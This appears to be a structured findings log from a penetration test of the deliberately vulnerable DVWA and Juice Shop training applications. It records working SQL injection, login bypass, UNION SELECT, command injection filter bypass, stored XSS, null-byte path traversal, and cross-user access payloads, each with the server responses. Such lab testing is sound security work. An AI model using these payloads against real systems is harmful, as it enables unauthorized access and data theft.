findings.title: SQL Injection via unsanitized 'id' parameter in DVWA SQLi page (low security)
request_sequence: GET http://dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit (session=dvwa_admin)
GET http://dvwa/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&Submit=Submit (session=dvwa_admin)
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 seeded user records in <pre> blocks: 'ID: 1' OR '1'='1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1' AND '1'='2 returned zero records (visible_text shows 'User ID:' with no First name/Surname output, and pre_blocks list is empty). This boolean-based differential response confirms classic string-context SQL injection in the id parameter.

findings.title: OS Command Injection via ip parameter using pipe-no-space bypass (DVWA high security)
request_sequence: GET http://dvwa/vulnerabilities/exec/  (confirmed form + 'Security Level: high')
POST http://dvwa/vulnerabilities/exec/  body: ip=127.0.0.1|whoami&Submit=Submit
findings.response_evidence:
[security=high] Confirmed page header 'Security Level: high'. High-level blacklist blocks '; ', '| ' (pipe+space), and '&&', but a pipe immediately followed by the command with NO trailing space bypasses the filter.

Payload: ip=127.0.0.1|whoami

Response visible_text included: "Enter an IP address: www-data" and the pre_blocks array returned exactly ["www-data"], confirming the whoami command executed server-side and the web process identity (www-data) was disclosed in the ping output — proof of OS command injection at DVWA high security.

findings.title: Stored XSS via 'mtxMessage' guestbook field in DVWA XSS (Stored) page (low security)
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'test', mtxMessage: '<script id=\"test_token\">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin)
browser_navigate http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin)
browser_eval_js('window.xss_flag')
findings.response_evidence: [security=low] Canary payload '<script id=\"test_token\">window.xss_flag=1</script>' (exactly 50 chars, fits mtxMessage maxlength) was accepted via POST (HTTP 200) and persisted to the guestbook without encoding. Upon re-loading the page in a live browser session (authenticated as dvwa_admin), the injected script executed client-side.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned result: 1, confirming the injected <script> tag executed in the DOM upon page render, proving stored/persistent XSS.

findings.title: SQL Injection via numeric boolean bypass at medium security (DVWA /vulnerabilities/sqli/)
request_sequence: GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> confirmed page reports 'Security Level: medium' and id field is now a <select> rendered on a POST form
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} (session=dvwa_admin) -- TRUE condition
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} (session=dvwa_admin) -- FALSE condition
findings.response_evidence: [security=medium] At medium security the id parameter is submitted via POST with quotes escaped server-side, requiring numeric boolean payloads (no quotes). TRUE payload id='1 OR 1=1' returned ALL 5 seeded user records (pre_blocks): "ID: 1 OR 1=1 First name: admin Surname: admin", "...Gordon Surname: Brown", "...Hack Surname: Me", "...Pablo Surname: Picasso", "...Bob Surname: Smith" — confirming the injected OR clause caused the query to return every row in the users table rather than just id=1. FALSE payload id='1 AND 1=2' returned zero records (no pre_blocks, visible_text shows only the form with no result rows). This TRUE(multiple rows)/FALSE(zero rows) contrast confirms SQL injection distinct from the low-security GET-based instance.

findings.title: SQL Injection via out-of-band session-input.php id parameter (DVWA high security)
request_sequence: POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' OR '1'='1' #&Submit=Submit
GET http://dvwa/vulnerabilities/sqli/  (renders using session-stored id)
POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' AND '1'='2' #&Submit=Submit
GET http://dvwa/vulnerabilities/sqli/  (renders using session-stored id)
findings.response_evidence:
[security=high] Confirmed page header 'Security Level: high' throughout test.

TRUE payload id=1' OR '1'='1' # stored via session-input.php (confirmed echoed: "Session ID: 1' OR '1'='1' #"). Subsequent GET /vulnerabilities/sqli/ returned FIVE seeded user records (bypassing single-row LIMIT expectation, the OR-based boolean condition matched all rows):
  ID: 1' OR '1'='1' # / First name: admin / Surname: admin
  ID: 1' OR '1'='1' # / First name: Gordon / Surname: Brown
  ID: 1' OR '1'='1' # / First name: Hack / Surname: Me
  ID: 1' OR '1'='1' # / First name: Pablo / Surname: Picasso
  ID: 1' OR '1'='1' # / First name: Bob / Surname: Smith

FALSE payload id=1' AND '1'='2' # stored via session-input.php (confirmed echoed: "Session ID: 1' AND '1'='2' #"). Subsequent GET /vulnerabilities/sqli/ returned ZERO records (no pre_blocks, visible_text contains no ID/First name/Surname entries) — only the standard 'Click here to change your ID' prompt.

This differential TRUE(multiple rows)/FALSE(zero rows) behavior confirms unsanitized SQL injection in the high-security out-of-band session-input id field, where the trailing '#' comment is required to neutralize the appended LIMIT clause.

findings.title: Cross-User Basket Access (BOLA) - acct2 can read acct1's basket by ID
request_sequence: GET /rest/basket/6 as juiceshop_acct1 -> 200, confirms own_basket_id=6, UserId=22, Products=[{id:1,name:'Apple Juice (1000ml)', BasketItem:{quantity:3, id:9}}]
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id is actually 7) -> 200, returns IDENTICAL basket data: id=6, UserId=22, Products=[{name:'Apple Juice (1000ml)', BasketItem:{quantity:3,id:9}}]
findings.response_evidence: acct1's own basket (id=6, UserId=22) contains Apple Juice (1000ml) qty 3 (BasketItem id 9). When authenticated as juiceshop_acct2 (whose own_basket_id is 7, a different UserId), requesting GET /rest/basket/6 returned HTTP 200 with the exact same basket data belonging to acct1 (UserId:22, same Products/BasketItem with quantity 3, id 9) -- no ownership check was enforced, allowing acct2 to read acct1's distinct seeded basket contents cross-user.

findings.title: Authentication Bypass via SQL Injection on login endpoint
request_sequence: POST /rest/user/login with json_body {"email": "' OR 1=1--", "password": "anything"} as unauth -> HTTP 200
findings.response_evidence: Request with SQLi payload email=\"' OR 1=1--\" and arbitrary password returned HTTP 200 with body: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The returned umail field confirms authentication was granted as the first user, admin@juice-sh.op, without valid credentials -- the injected SQL comment (--) truncated the password check in the backend query, bypassing authentication entirely. A valid JWT auth token was issued, proving the bypass.

findings.title: SQL Injection in Product Search (error-based + UNION-based)
request_sequence: GET /rest/products/search?q=qwert' as unauth -> HTTP 500
GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- as unauth -> HTTP 200
findings.response_evidence: 1) q=qwert' triggered HTTP 500 with body: \"Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error\" -- proving the raw input is concatenated unsanitized into a backend SQL query, causing a syntax error (error-based SQLi confirmation).\n2) q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 with valid JSON: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} -- the literal integer values 1-9 were reflected directly into the expected product fields (name=2, description=3, etc.), demonstrating a successful 9-column UNION SELECT injection that overrides the original query's result set entirely.

findings.title: Open Directory Listing on /ftp/ exposes confidential acquisitions memo
request_sequence: GET http://juiceshop:3000/ftp/ HTTP/1.1  Headers: Accept: text/html,application/json  Session: unauth
GET http://juiceshop:3000/ftp/acquisitions.md HTTP/1.1  Session: unauth
findings.response_evidence:
Step 1: GET /ftp/ returned HTTP 200 with a serve-index style directory listing. visible_text confirmed: 'listing directory /ftp/ ~ / ftp / quarantine ... acquisitions.md 909 ... announcement_encrypted.md ... coupons_2013.md.bak ... legal.md ... package.json.bak ... suspicious_errors.yml' and an explicit hyperlink to http://juiceshop:3000/ftp/acquisitions.md was present in html_summary.links, proving the directory is openly browsable and acquisitions.md is discoverable without authentication.

Step 2: GET /ftp/acquisitions.md returned HTTP 200, content_type text/markdown, with body: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year.
This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.' This is the verbatim confidential acquisition memo text, retrievable with no authentication, confirming CWE-200 exposure of a confidential document via an open directory listing.

findings.title: Unauthenticated access to /api/Feedbacks discloses user PII (email fragments + UserId linkage)
request_sequence: GET http://juiceshop:3000/api/Feedbacks HTTP/1.1  Session: unauth (no Authorization header, no cookies/session token sent)
findings.response_evidence: Request was sent entirely unauthenticated (unauth session, no Authorization/Bearer header, no auth cookie). Server responded HTTP 200 with content_type application/json and a JSON array of 8 feedback records. Each record includes a numeric UserId (1,2,3,21,...) directly linking feedback to specific user accounts, and several comment fields embed the submitting user's email address (partially redacted but domain-complete and linkable): comment id 1: \"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\" for UserId 1; id 2: \"Great shop! Awesome service! (***@juice-sh.op)\" for UserId 2; id 3: \"Nothing useful available here! (***der@juice-sh.op)\" for UserId 3; id 4: \"...(***ereum@juice-sh.op)\" for UserId 21 (this record also leaks a 12-word crypto wallet seed phrase). No authentication of any kind was required to retrieve this data, confirming CWE-359: the endpoint discloses personally identifying information (email address fragments bound to specific numeric UserIds, i.e., real registered accounts) to anonymous/unauthenticated callers.

findings.title: Poison Null-Byte Path Traversal bypasses extension allowlist on /ftp/ endpoint
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak -> HTTP 403 'Error: Only .md and .pdf files are allowed!' (fileServer.js verify() extension filter rejects .bak)

GET http://juiceshop:3000/ftp/package.json.bak%2500.md -> HTTP 200, returns full package.json.bak content (null byte truncates the path after the server's extension check but before filesystem read, so verify() sees '.md' but fs reads 'package.json.bak')
findings.response_evidence:
Baseline: GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' thrown from fileServer.js verify() at line 55, proving the server-side extension allowlist blocks .bak directly.

Bypass: GET /ftp/package.json.bak%2500.md (URL-encoded null byte 0x00 followed by allowed .md extension) returned HTTP 200 with content-type application/octet-stream and full file content of the restricted backup, e.g.:
'{\n  "name": "juice-shop",\n  "version": "6.2.0-SNAPSHOT",\n  "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {"body-parser": "~1.18", ... "sqlite3": "~3.1.13", "z85": "~0.0"} ...'
This confirms the poison null-byte technique bypasses the extension filter and discloses package.json.bak, satisfying both required criteria (403 baseline + 200 bypass with actual restricted file content).

findings.title: Exposed Encryption Keys Directory via browsable directory listing
request_sequence: GET http://juiceshop:3000/encryptionkeys/ (Accept: text/html,application/json) -> HTTP 200 serve-index directory listing
findings.response_evidence: Unauthenticated GET /encryptionkeys/ returned HTTP 200 with a serve-index generated HTML directory listing. Visible text extracted: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. The listing contains direct hyperlinks to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key, both sensitive cryptographic key files (JWT public key and premium feature signing key) exposed without any authentication, confirming an open directory listing disclosing sensitive key material.
